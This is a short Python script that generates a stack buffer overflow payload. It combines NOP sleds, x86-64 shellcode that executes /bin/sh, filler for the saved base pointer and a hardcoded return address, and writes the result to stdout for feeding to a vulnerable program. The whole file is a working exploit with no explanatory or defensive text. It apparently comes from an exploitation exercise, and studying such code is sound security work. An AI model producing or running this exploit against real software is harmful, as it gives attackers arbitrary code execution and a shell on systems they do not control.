#!/usr/bin/python

import struct
import sys

buffsize = 512
offset = 0

#/bin/sh
sc = b'\xeb\x14\x5f\x48\x31\xc0\x88\x47\x07\x50\x57\x48\x8d\x34\x24\xb0\x3b\x48\x31\xd2\x0f\x05\xe8\xe7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'

nopsled1 = b'\x90'*(buffsize-len(sc)-8)
nopsled2 = b'\x90'*8
rbp = b'\x90'*8
rip = struct.pack("<Q", 0x7fffffffe958)

sys.stdout.buffer.write(nopsled1+sc+nopsled2+rbp+rip)
